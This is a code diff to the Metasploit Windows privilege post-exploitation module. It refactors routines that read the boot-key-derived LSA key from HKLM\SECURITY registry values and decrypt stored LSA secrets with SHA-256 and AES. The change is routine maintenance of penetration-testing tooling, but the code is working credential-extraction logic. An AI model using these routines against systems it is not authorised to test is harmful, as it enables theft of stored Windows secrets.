@@ -158,12 +158,14 @@ module Msf::Post::Windows::Priv
   #
   # Returns the LSA key upon input of the unscrambled bootkey
   #
+  # @note This requires the session be running as SYSTEM
+  #
   def capture_lsa_key(bootkey)
     vprint_status("Getting PolSecretEncryptionKey...")
     pol = registry_getvaldata("HKLM\\SECURITY\\Policy\\PolSecretEncryptionKey", "")
     if pol
-      print_status("XP or below client")
-      @vista = 0
+      print_status("XP or below system")
+      @lsa_vista_style = false
       md5x = Digest::MD5.new()
       md5x << bootkey
       (1..1000).each do
@@ -176,8 +178,8 @@ module Msf::Post::Windows::Priv
       lsa_key << rc4.final
       lsa_key = lsa_key[0x10..0x1F]
     else
-      print_status("Vista or above client")
-      @vista = 1
+      print_status("Vista or above system")
+      @lsa_vista_style = true
 
       vprint_status("Trying 'V72' style...")
       vprint_status("Getting PolEKList...")
@@ -194,17 +196,30 @@ module Msf::Post::Windows::Priv
     return lsa_key
   end
 
-  # Decrypts the LSA encrypted data
+  # Whether this system has Vista-style secret keys
   #
-  # @param pol [String] The policy key stored in the registry
-  # @param encrypted_key [String]
+  # @return [Boolean] True if this session has keys in the PolEKList
+  #   registry key, false otherwise.
+  def lsa_vista_style?
+    if @lsa_vista_style.nil?
+      @lsa_vista_style = !!(registry_getvaldata("HKLM\\SECURITY\\Policy\\PolEKList", ""))
+    end
+
+    @lsa_vista_style
+  end
+
+  # Decrypts LSA encrypted data
+  #
+  # @param policy_secret [String] The encrypted data stored in the
+  #   registry.
+  # @param lsa_key [String] The key as returned by {#capture_lsa_key}
   # @return [String] The decrypted data
-  def decrypt_lsa_data(pol, encrypted_key)
+  def decrypt_lsa_data(policy_secret, lsa_key)
 
     sha256x = Digest::SHA256.new()
-    sha256x << encrypted_key
-    (1..1000).each do
-      sha256x << pol[28,32]
+    sha256x << lsa_key
+    1000.times do
+      sha256x << policy_secret[28,32]
     end
 
     aes = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
@@ -214,11 +229,10 @@ module Msf::Post::Windows::Priv
 
     decrypted_data = ''
 
-    for i in (60...pol.length).step(16)
+    (60...policy_secret.length).step(16) do |i|
       aes.decrypt
       aes.padding = 0
-      xx = aes.update(pol[i...i+16])
-      decrypted_data << xx
+      decrypted_data << aes.update(policy_secret[i,16])
     end
 
     return decrypted_data
